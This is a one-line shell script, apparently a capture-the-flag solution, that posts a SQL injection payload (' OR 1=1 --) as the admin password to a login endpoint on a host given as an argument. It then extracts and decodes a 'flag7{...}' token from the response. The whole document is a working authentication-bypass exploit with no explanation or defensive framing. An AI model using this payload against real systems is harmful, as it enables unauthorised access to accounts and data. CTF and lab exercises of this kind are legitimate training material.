curl -s -N -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=admin&password=' OR 1=1 --" $1:1614 | grep --color -o 'flag7%7B.*%7D"' | sed 's/%7B/{/g; s/%7D/}/g; s/"/ /g'
